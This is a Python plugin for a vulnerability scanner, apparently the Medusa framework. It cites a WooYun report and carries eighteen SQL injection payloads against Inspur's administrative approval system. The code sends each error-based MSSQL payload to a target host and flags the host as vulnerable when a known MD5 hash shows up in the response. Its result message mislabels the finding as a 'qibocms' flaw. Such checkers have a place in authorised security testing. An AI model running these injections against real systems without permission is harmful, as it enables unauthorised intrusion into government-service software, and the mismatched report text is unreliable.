#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 浪潮行政审批系统十八处注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0128477
author: Lucifer
description: 多处注入。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payloads = ["/Login/Log.aspx?loginname=%27/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--",
                    "/Bulletin/BusinessView.aspx?infoflowId=00003%27/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--",
                    "/ViewSource/SrcWorkProgram.aspx?infoflowId=00003%27/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--",
                    "/Bulletin/ColumnList.aspx?LanMuId=%27/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--",
                    "/OnlineQuery/GetFlowItem.aspx?DeptId=%27/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--",
                    "/ViewSource/SrcFormList.aspx?listType=&infoflowId=00003%27/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--&SerailNO=",
                    "/ViewSource/FujianDownLoad.aspx?Id=1/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--",
                    "/ViewSource/SrcNotice.aspx?infoflowId=00003%27/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--",
                    "/Bulletin/QAList.aspx?infoflowId=1'/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--&AspxAutoDetectCookieSupport=1",
                    "/Bulletin/PolicyDownLoad.aspx?ID=1'/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--",
                    "/Bulletin/PolicyList.aspx?infoflowId=00003'/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--&AspxAutoDetectCookieSupport=1",
                    "/login/TransactList.aspx?ItemName=1'/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--",
                    "/Broadcast/displayNewsPic.aspx?id=00357'/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--",
                    "/Bulletin/DocmentDownload.aspx?ID=00247'/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--",
                    "/LeaderMail/MailDetail.aspx?QueryId=11'/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--",
                    "/ViewSource/SrcPrintList.aspx?SerailNO='/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--",
                    "/Business/OfflineDownload.aspx?formId=BBQB'/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--&filetype=html&infoflowId=00263",
                    "/ViewSource/ProExamineView.aspx?ActivityInstanceId=&ActivitySchemeGuid=9a0b1f9e-d564-4ec9-945f-600b5a4dd2ed'/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--"]
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global   resp
    Medusas=[]
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'User-Agent': RandomAgent,
    }
    try:
        for payload in payloads:
            payload_url = scheme + "://" + url + payload
            #s = requests.session()
            if ProxyIp!=None:
                proxies = {
                    # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                    "http": "http://" + str(ProxyIp)
                }
                resp = requests.get(payload_url,  headers=headers, proxies=proxies, timeout=5, verify=False)
            elif ProxyIp==None:
                resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
            con = resp.text
            code = resp.status_code
            if con.lower().find('81dc9bdb52d04dc20036dbd8313ed055')!=-1:
                Medusa = "{} 存在qibocms知道系统注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                Medusas.append(str(Medusa))
    except Exception as e:
        pass
    return Medusas